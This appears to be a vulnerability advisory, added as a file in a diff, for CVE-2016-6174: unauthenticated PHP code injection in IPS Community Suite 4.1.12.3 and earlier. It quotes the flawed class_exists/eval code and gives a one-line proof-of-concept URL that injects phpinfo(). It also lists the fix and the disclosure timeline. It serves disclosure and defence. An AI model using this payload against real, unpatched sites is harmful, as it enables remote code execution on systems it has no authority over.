@@ -1,0 +1,72 @@
+---------------------------------------------------------------------------
+IPS Community Suite <= 4.1.12.3 Autoloaded PHP Code Injection Vulnerability
+---------------------------------------------------------------------------
+
+
+[-] Software Link:
+
+https://invisionpower.com/
+
+
+[-] Affected Versions:
+
+Version 4.1.12.3 and prior versions.
+
+
+[-] Vulnerability Description:
+
+The vulnerable code is located in the /applications/core/modules/front/system/content.php script:
+
+38.	$class = 'IPS\\' . implode( '\\', explode( '_', \IPS\Request::i()->content_class ) );
+39.	
+40.	if ( ! class_exists( $class ) or ! in_array( 'IPS\Content', class_parents( $class ) ) )
+41.	{
+42.	    \IPS\Output::i()->error( 'node_error', '2S226/2', 404, '' );
+43.	}
+
+User input passed through the "content_class" request parameter is not properly sanitized before being used in a call
+to the "class_exists()" function at line 40. This could be exploited by unauthenticated attackers to inject and execute
+arbitrary PHP code leveraging the autoloading function defined into the /applications/cms/Application.php script:
+
+171.	if ( mb_substr( $class, 0, 14 ) === 'IPS\cms\Fields' and is_numeric( mb_substr( $class, 14, 1 ) ) )
+172.	{
+173.	    $databaseId = mb_substr( $class, 14 );
+174.	    eval( "namespace IPS\\cms; class Fields{$databaseId} extends Fields { public static \$customDatabaseId [...]
+175.	}
+
+Successful exploitation of this vulnerability requires the application running on PHP before version 5.4.24 or 5.5.8.
+
+
+[-] Proof of Concept:
+
+http://[host]/[ips]/index.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}phpinfo();/*
+
+
+[-] Solution:
+
+Update to version 4.1.13 or later.
+
+
+[-] Disclosure Timeline:
+
+[04/07/2016] - Vendor notified
+[05/07/2016] - Vulnerability fixed in version 4.1.13: https://invisionpower.com/release-notes/4113-r44/
+[06/07/2016] - CVE number requested
+[06/07/2016] - CVE number assigned
+[07/07/2016] - Public disclosure
+
+
+[-] CVE Reference:
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org)
+has assigned the name CVE-2016-6174 to this vulnerability.
+
+
+[-] Credits:
+
+Vulnerability discovered by Egidio Romano.
+
+
+[-] Original Advisory:
+
+http://karmainsecurity.com/KIS-2016-11
